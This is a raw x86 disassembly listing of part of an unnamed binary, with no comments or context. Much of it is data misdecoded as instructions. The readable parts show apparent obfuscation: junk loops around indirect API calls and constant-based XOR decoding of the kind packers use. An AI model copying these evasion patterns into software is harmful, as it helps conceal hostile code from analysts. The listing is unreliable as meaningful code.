  408a72:	cmp    eax,0x6c8ef93a
  408a77:	add    al,BYTE PTR [ecx+0x161d8fc9]
  408a7d:	or     DWORD PTR [ebx+0x18c25dc1],0xec8b5500
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e8ea,0x1d
  408a92:	cmp    DWORD PTR ds:0x42e8ea,0x0
  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e8ea,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430616
  408ab1:	push   0x42efb0
  408ab6:	push   0x69fb
  408abb:	call   DWORD PTR ds:0x42ec2c
  408ac1:	mov    ecx,DWORD PTR ds:0x42e8ea
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e8ea,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e8e6,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x430642,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	stos   BYTE PTR es:[edi],al
  408b13:	mov    DWORD PTR [ebx+0x7ed2a58b],esp
  408b19:	jle    0x408b60
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408af8
  408b1f:	sti    
  408b20:	or     edi,DWORD PTR [edx-0xf]
  408b23:	lods   al,BYTE PTR ds:[esi]
  408b24:	stc    
  408b25:	fnstenv ds:0xae83384c
  408b2b:	ret    0xfcb8
  408b2e:	xchg   edx,eax
  408b2f:	xchg   ebp,eax
  408b30:	mov    dl,0xb8
  408b32:	pop    esi
  408b33:	add    ah,BYTE PTR [esi+ebp*4+0x7d2d49af]
  408b3a:	add    ebp,DWORD PTR [esi-0x3f7cad97]
  408b40:	popf   
  408b41:	jno    0x408b4d
  408b43:	cmc    
  408b44:	dec    eax
  408b45:	adc    DWORD PTR [ecx],eax
  408b47:	pminub mm7,QWORD PTR [ecx]
  408b4a:	sub    eax,0x486d7edd
  408b4f:	lock int3 
  408b51:	in     eax,dx
  408b52:	je     0x408b5d
  408b54:	neg    DWORD PTR [ecx-0x2eb25c03]
  408b5a:	dec    esi
  408b5b:	sbb    BYTE PTR [ecx],ch
  408b5d:	push   0xe2bc5609
  408b62:	ins    DWORD PTR es:[edi],dx
  408b63:	push   edx
  408b64:	xor    DWORD PTR [ebx+0x28],eax
  408b67:	and    al,0x84
  408b69:	sub    ebx,DWORD PTR [ebx+0x4fa1797d]
  408b6f:	pop    ebp
  408b70:	cmp    BYTE PTR [ebp+ecx*2-0x55],bl
  408b74:	push   0xa53767ce
  408b79:	sbb    ebx,ecx
  408b7b:	mov    esp,0xe969829b
  408b80:	pop    es
  408b81:	add    bl,BYTE PTR [edi-0x1d4cdd90]
  408b87:	fld    st(2)
  408b89:	int3   
  408b8a:	jl     0x408bca
  408b8c:	dec    esi
  408b8d:	mov    DWORD PTR [edi],ebx
  408b8f:	leave  
  408b90:	scas   eax,DWORD PTR es:[edi]
  408b91:	sub    eax,ecx
  408b93:	mov    esp,0x8b20156e
  408b98:	jne    0x408b30
  408b9a:	stos   DWORD PTR es:[edi],eax
  408b9b:	int3   
  408b9c:	xor    DWORD PTR [esp+ebx*1-0x80],edi
  408ba0:	mov    dh,0x63
  408ba2:	xor    DWORD PTR [edx+0x51855da9],0x6a36657
  408bac:	pop    edx
  408bad:	icebp  
  408bae:	stos   DWORD PTR es:[edi],eax
  408baf:	fadd   DWORD PTR [edi-0x40]
  408bb2:	xor    DWORD PTR [esi+0x45],eax
  408bb5:	pop    edx
  408bb6:	mov    al,ds:0xf3daa0b5
  408bbb:	xchg   esi,eax
  408bbc:	add    BYTE PTR [esp+edx*1+0x59e1a74d],bl
  408bc3:	leave  
  408bc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bc5:	mov    edi,0x2cc6f5d5
  408bca:	loopne 0x408c4a
  408bcc:	xor    eax,0xef6b8db
  408bd1:	sbb    BYTE PTR ds:0x7b00e45,bl
  408bd7:	lock sahf 
  408bd9:	pop    ds
  408bda:	pop    esp
  408bdb:	xor    DWORD PTR [edi-0x15],eax
  408bde:	inc    ecx
  408bdf:	add    BYTE PTR ds:0x23242238,dl
  408be5:	jecxz  0x408baf
  408be7:	adc    BYTE PTR [esi-0x30],ah
  408bea:	fwait
  408beb:	jmp    0x408bca
  408bed:	mov    al,ds:0xa4ae3e09
  408bf2:	push   cs
  408bf3:	push   ecx
  408bf4:	(bad)  
  408bf5:	jge    0x408bbc
  408bf7:	test   edi,ebp
  408bf9:	aad    0x5e
  408bfb:	mov    esi,0x13327578
  408c00:	fwait
  408c01:	test   ecx,edx
  408c03:	inc    esp
  408c04:	cmp    esi,DWORD PTR [edx+0x4d]
  408c07:	enter  0x26fe,0x6b
  408c0b:	in     eax,0xab
  408c0d:	dec    esi
  408c0e:	out    0xd5,al
  408c10:	lods   al,BYTE PTR ds:[esi]
  408c11:	mov    ebp,0xc171ce9b
  408c16:	add    ah,BYTE PTR [ecx]
  408c18:	mov    eax,0x2a661edd
  408c1d:	clc    
  408c1e:	mov    ah,0x4c
  408c20:	icebp  
  408c21:	jp     0x408c00
  408c23:	mov    DWORD PTR [ebx-0x53cca014],0xc2541a1f
  408c2d:	(bad)  
  408c2e:	pop    esp
  408c2f:	cdq    
  408c30:	sub    edx,ebx
  408c32:	je     0x408c81
  408c34:	push   edi
  408c35:	mov    eax,esp
  408c37:	test   eax,0xd12be24e
  408c3c:	sbb    al,0xa7
  408c3e:	mul    DWORD PTR [ebp+0x5302985c]
  408c44:	out    0x2d,eax
  408c46:	mov    edi,0x8067f912
  408c4b:	out    dx,al
  408c4c:	test   BYTE PTR [ecx+eiz*1-0x67],cl
  408c50:	scas   al,BYTE PTR es:[edi]
  408c51:	(bad)  
  408c53:	adc    al,0xb8
  408c55:	jno    0x408c52
  408c57:	aas    
  408c58:	pop    esi
  408c59:	dec    esi
  408c5a:	push   ebp
  408c5b:	mov    eax,0xe26a3879
  408c60:	or     edx,DWORD PTR [ebp+0x446fefbc]
  408c66:	(bad)  
  408c67:	push   0xffffffb4
  408c69:	(bad)  
  408c6a:	adc    BYTE PTR [edx-0x20],dl
  408c6d:	push   esi
  408c6e:	aam    0xfb
  408c70:	cmp    BYTE PTR [ecx-0xe0c639a],0x36
  408c77:	mov    dh,0x52
  408c79:	fucomi st,st(4)
  408c7b:	aas    
  408c7c:	pop    ebp
  408c7d:	shl    cl,1
  408c7f:	jno    0x408c4d
  408c81:	xor    al,0x1e
  408c83:	neg    BYTE PTR [eax-0x26]
  408c86:	rcr    BYTE PTR [eax+0x41],cl
  408c89:	jg     0x408cf1
  408c8b:	mov    eax,ds:0xeb459103
  408c90:	mov    dh,0x6e
  408c92:	inc    edx
  408c93:	repnz mov cs,WORD PTR [ebp+0xc]
  408c97:	fst    DWORD PTR [edi+0x7b90869b]
  408c9d:	push   esp
  408c9e:	jb     0x408d1b
  408ca0:	loope  0x408cc2
  408ca2:	int    0x89
  408ca4:	mov    al,ds:0x6d18e44a
  408ca9:	cs mov ebp,0x68fcd469
  408caf:	push   edi
  408cb0:	loop   0x408c95
  408cb2:	add    dl,BYTE PTR [edx]
  408cb4:	and    BYTE PTR [edx+0x5],ah
  408cb7:	push   edx
  408cb8:	aad    0x93
  408cba:	jo     0x408cc0
  408cbc:	test   al,0xb
  408cbe:	sbb    esp,DWORD PTR [edx]
  408cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cc1:	pop    ebp
  408cc2:	icebp  
  408cc3:	jge    0x408d10
  408cc5:	sub    al,0x13
  408cc7:	dec    ecx
  408cc8:	xchg   BYTE PTR [edi+0x34],dl
  408ccb:	pop    esi
  408ccc:	xchg   ebp,eax
  408ccd:	mov    ebx,0xcf91c1ad
  408cd2:	push   ss
  408cd3:	jmp    0x408d42
  408cd5:	push   ecx
  408cd6:	xor    ah,BYTE PTR [edi-0x1f2bde9e]
  408cdc:	and    dh,BYTE PTR [eax-0x2c]
  408cdf:	(bad)  
  408ce0:	mov    ecx,0x9219702
  408ce5:	xchg   ebx,eax
  408ce6:	popa   
  408ce7:	lds    ebx,FWORD PTR [eax]
  408ce9:	test   DWORD PTR [edi-0x7f],edi
  408cec:	mov    edx,0xf3290fb2
  408cf1:	mov    edi,ebx
  408cf3:	dec    ebx
  408cf4:	sub    BYTE PTR ds:0x32729d,al
  408cfa:	mov    DWORD PTR [edx],eax
  408cfc:	mov    edx,DWORD PTR ds:0x4306f6
  408d02:	mov    eax,ds:0x430712
  408d07:	sub    edx,eax
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	pop    edi
  408d55:	xor    eax,esp
  408d57:	or     BYTE PTR [esp+edx*8+0x7f457e7e],cl
  408d5e:	jle    0x408dde
  408d60:	in     eax,dx
  408d61:	adc    esp,DWORD PTR [esp+ecx*2]
  408d64:	sbb    DWORD PTR [eax],edx
  408d66:	les    esi,FWORD PTR ds:[esp+ecx*8+0x1e2481be]
  408d6e:	imul   edi,DWORD PTR [ecx+0x3e2a822d],0x61dd5455
  408d78:	xor    eax,ebp
  408d7a:	test   al,0x7
  408d7c:	xchg   esi,eax
  408d7d:	sti    
  408d7e:	add    DWORD PTR [edx],edi
  408d80:	jno    0x408d9b
  408d82:	sahf   
  408d83:	mov    ds:0x9f080c39,eax
  408d88:	sub    BYTE PTR [ecx],bl
  408d8a:	pushf  
  408d8b:	pusha  
  408d8c:	push   esp
  408d8d:	jmp    0x89a0:0xd250be15
  408d94:	test   edi,ecx
  408d96:	ret    0x84f9
  408d99:	mov    ss,WORD PTR [ebx+ebp*1]
  408d9c:	in     al,dx
  408d9d:	test   ecx,esp
  408d9f:	andnps xmm2,xmm3
  408da2:	inc    esp
  408da3:	mov    cl,0x38
  408da5:	inc    eax
  408da6:	das    
  408da7:	inc    edx
  408da8:	cld    
  408da9:	mov    ds:0x5a27f78f,eax
  408dae:	inc    esp
  408daf:	sbb    BYTE PTR [edi],0x3b
  408db2:	sbb    eax,eax
  408db4:	int3   
  408db5:	jne    0x408de9
  408db7:	mov    dh,0x35
  408db9:	push   0x72
  408dbb:	jb     0x408d85
  408dbd:	out    0x38,al
  408dbf:	adc    DWORD PTR [ecx-0xdeebe72],esp
  408dc5:	push   esi
  408dc6:	sbb    eax,0xa9f9be0c
  408dcb:	inc    ebp
  408dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dcd:	data16 mov bl,0x47
  408dd0:	jb     0x408e30
  408dd2:	jno    0x408dee
  408dd4:	add    bl,BYTE PTR [ebx+eiz*1+0x6a]
  408dd8:	into   
  408dd9:	jno    0x408db0
  408ddb:	sahf   
  408ddc:	xlat   BYTE PTR ds:[ebx]
  408ddd:	or     ch,al
  408ddf:	lds    edx,FWORD PTR [ecx-0x39]
  408de2:	jecxz  0x408dcf
  408de4:	xchg   ecx,eax
  408de5:	cmc    
  408de6:	imul   eax,DWORD PTR [eax+0x2589843b],0xffffffb9
  408ded:	adc    eax,0xb357cb22
  408df2:	add    DWORD PTR [edi+0x3e],0x57d2bbf1
  408df9:	add    BYTE PTR [edi-0x32bf051a],0xc3
  408e00:	mov    ds:0x121aea66,al
  408e05:	add    esi,DWORD PTR [ebp+0x2a274de2]
  408e0b:	xchg   DWORD PTR ds:0xa3ca87a6,esp
  408e12:	mov    bh,0x4a
  408e14:	mov    eax,0x781075b
  408e19:	bound  edx,QWORD PTR [edx]
  408e1b:	pusha  
  408e1c:	or     eax,0xb46b4aaf
  408e21:	in     eax,0xfe
  408e23:	daa    
  408e24:	mov    eax,ds:0x4b960517
  408e29:	pop    eax
  408e2a:	push   ebp
  408e2b:	dec    esp
  408e2c:	pop    ds
  408e2d:	cmp    esi,DWORD PTR [eax+0x974274c]
  408e33:	sbb    BYTE PTR ss:[edi+eiz*1+0x1],ah
  408e38:	inc    edx
  408e39:	or     ah,ah
  408e3b:	jmp    0xc1dc97ab
  408e40:	retf   
  408e41:	jecxz  0x408e69
  408e43:	jmp    0x408e03
  408e45:	jmp    0x408e5e
  408e47:	aad    0x81
  408e49:	add    cl,cl
  408e4b:	icebp  
  408e4c:	ficomp DWORD PTR [eax-0x42]
  408e4f:	pusha  
  408e50:	call   DWORD PTR [edi+0x3d0be81a]
  408e56:	jb     0x408ea0
  408e58:	call   0x71d1:0x4289fa73
  408e5f:	fld    DWORD PTR [ebx+0x30]
  408e62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e63:	sub    al,BYTE PTR [edx]
  408e65:	stos   DWORD PTR es:[edi],eax
  408e66:	xor    esi,DWORD PTR [ecx-0x22]
  408e69:	inc    eax
  408e6a:	jo     0x408e7e
  408e6c:	ins    DWORD PTR es:[edi],dx
  408e6d:	push   es
  408e6e:	cdq    
  408e6f:	fsubr  DWORD PTR [ecx+eax*1+0x35d3862d]
  408e76:	gs pushf 
  408e78:	stc    
  408e79:	ja     0x408e74
  408e7b:	imul   esi,DWORD PTR [esi],0x6b
  408e7e:	ds push edi
  408e80:	(bad)  
  408e82:	xor    DWORD PTR [ecx+0x22],edi
  408e85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e86:	cmp    ebx,DWORD PTR [edx-0x12]
  408e89:	lods   al,BYTE PTR ds:[esi]
  408e8a:	sub    DWORD PTR [edi],esi
  408e8c:	xchg   esp,eax
  408e8d:	pop    esp
  408e8e:	repz pop es
  408e90:	inc    edx
  408e91:	scas   al,BYTE PTR es:[edi]
  408e92:	pop    edi
  408e93:	ss or  edx,0x127ef0ef
  408e9a:	sbb    ch,ch
  408e9c:	push   esp
  408e9d:	xchg   ch,bh
  408e9f:	fwait
  408ea0:	fwait
  408ea1:	adc    eax,0x8655d154
  408ea6:	nop
  408ea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ea8:	es mov eax,0xb922cadf
  408eae:	mov    ds:0xabe6f42c,eax
  408eb3:	loopne 0x408f33
  408eb5:	lds    eax,FWORD PTR [edi]
  408eb7:	jnp    0x408eb4
  408eb9:	repz sbb BYTE PTR [ebp-0x1ce560d],al
  408ec0:	mov    eax,ds:0x8aa1570c
  408ec5:	(bad)  
  408ec6:	and    al,0x6
  408ec8:	je     0x408e7b
  408eca:	enter  0x3e21,0x22
  408ece:	xlat   BYTE PTR ds:[ebx]
  408ecf:	jecxz  0x408edb
  408ed1:	mov    bh,0xff
  408ed3:	scas   eax,DWORD PTR es:[edi]
  408ed4:	adc    eax,DWORD PTR [ecx+0x62]
  408ed7:	addr16 push ss
  408ed9:	sub    BYTE PTR [edx+0x22],ah
  408edc:	pop    ecx
  408edd:	out    0x3e,al
  408edf:	outs   dx,BYTE PTR ds:[esi]
  408ee0:	add    DWORD PTR es:[ebx+0x5c],eax
  408ee4:	loope  0x408f29
  408ee6:	cmp    edx,ecx
  408ee8:	inc    esp
  408ee9:	mov    ecx,0x17aa06e
  408eee:	call   0xc55f:0x18195f90
  408ef5:	mov    edx,0x3230cdd8
  408efa:	pop    edi
  408efb:	add    DWORD PTR [eax+0x3f],esi
  408efe:	aad    0x3f
  408f00:	pop    esi
  408f01:	fidivr WORD PTR [edi-0x30c80d43]
  408f07:	adc    al,0xea
  408f09:	sub    eax,0x29f49f5
  408f0e:	adc    dh,dl
  408f10:	sar    eax,0x65
  408f13:	mov    WORD PTR [eax+0x3e],ss
  408f16:	lock inc ebx
  408f18:	imul   ecx,DWORD PTR [edx+0x158928dc],0xfcb6eb08
  408f22:	push   ebx
  408f23:	shl    DWORD PTR [edi+0x0],1
  408f26:	pop    ds
  408f27:	jnp    0x408eea
  408f29:	cs cs gs (bad) 
  408f2d:	sbb    BYTE PTR [ebx],al
  408f2f:	xlat   BYTE PTR ds:[ebx]
  408f30:	jns    0x408ee6
  408f32:	and    BYTE PTR [ebx],ah
  408f34:	imul   edi,esp,0xffffff81
  408f37:	xor    eax,ecx
  408f39:	add    eax,0x32729d
  408f3e:	leave  
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ef88,0x42e8ea
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x4306c6,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42efa8,0x42e8e6
  408f71:	call   DWORD PTR ds:0x42ebcc
  408f77:	sbb    DWORD PTR ds:0x42e8e2,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x43062e,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x430632,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42ec84
  408faf:	sbb    DWORD PTR ds:0x4306d2,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e8da,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x430642,0x42ef88
  408fe0:	call   DWORD PTR ds:0x42ed00
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42efa4,0x1c30
  408ff5:	call   DWORD PTR ds:0x42ecc4
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x4306da,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ef94,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e8e2,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42ebbc
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x43062a
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42efa4,0x43061a
  409056:	call   DWORD PTR ds:0x42ec5c
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e8e2,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e8e2
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e8e2,ebx
  40907e:	cmp    DWORD PTR ds:0x42e8e2,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ed2c
  409097:	cmp    DWORD PTR ds:0x42e8e2,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ef94
  4090aa:	and    DWORD PTR ds:0x42efa0,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43060e
  4090bc:	sbb    edx,DWORD PTR ds:0x4306ce
  4090c2:	mov    DWORD PTR ds:0x43060e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43061e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43061e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43061e,edx
  4090e2:	cmp    DWORD PTR ds:0x43061e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e8fa
  4090f9:	push   0x42ea2d
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ed30
  409109:	cmp    DWORD PTR ds:0x43061e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e8e6,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e8e6
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e8e6,edx
  40912d:	cmp    DWORD PTR ds:0x42e8e6,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42ec30
  40914a:	cmp    DWORD PTR ds:0x42e8e6,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43061a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43060a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43060a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43060a,esi
  40917b:	cmp    DWORD PTR ds:0x43060a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e9fb
  40918d:	push   0x42e8fa
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42ec48
  40919d:	cmp    DWORD PTR ds:0x43060a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43060a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43060a,esi
  4091b7:	cmp    DWORD PTR ds:0x43060a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ef9c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x4306ce,0x430622
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x4306ce
  4091fe:	adc    DWORD PTR ds:0x42ef98,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43060e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43060e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43060e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43061e,0x43063a
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x43062e,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x430662
  409277:	mov    eax,ds:0x42eb1c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e8ee,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x43062a
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x43063a
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x430632
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x4306d6,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42efa0,0x10
  4092e1:	cmp    DWORD PTR ds:0x42efa0,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42efa0,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42ec4c
  409310:	mov    edi,DWORD PTR ds:0x42efa0
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42efa0,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ef94,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e8f6,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e8f2
  40934d:	adc    edx,DWORD PTR ds:0x430642
  409353:	mov    DWORD PTR ds:0x42e8f2,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42efac,0x0
  409369:	mov    edi,DWORD PTR ds:0x42efac
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42efac,edi
  409376:	cmp    DWORD PTR ds:0x42efac,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e8e6
  40938b:	call   DWORD PTR ds:0x42ed34
  409391:	cmp    DWORD PTR ds:0x42efac,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42efac
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42efac,edi
  4093ad:	cmp    DWORD PTR ds:0x42efac,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x430632,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42efa8,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42efa8
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42efa8,edi
  4093e2:	cmp    DWORD PTR ds:0x42efa8,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42efa8,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42ec50
  409402:	cmp    DWORD PTR ds:0x42efa8,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42efa8
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42efa8,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ef8c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ef8c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ef8c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42ec34
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ef8c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ef8c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x4306da
  40946a:	add    eax,ebx
  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43060a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43061e
  409480:	adc    edi,DWORD PTR ds:0x42ef98
  409486:	mov    DWORD PTR ds:0x43061e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
  40948f:	sbb    DWORD PTR ds:0x42efb0,0x42e8ea
  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42efa0,0x43063a
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x430642
  4094b1:	and    DWORD PTR ds:0x43063e,edi
  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e8f6,0x43061a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
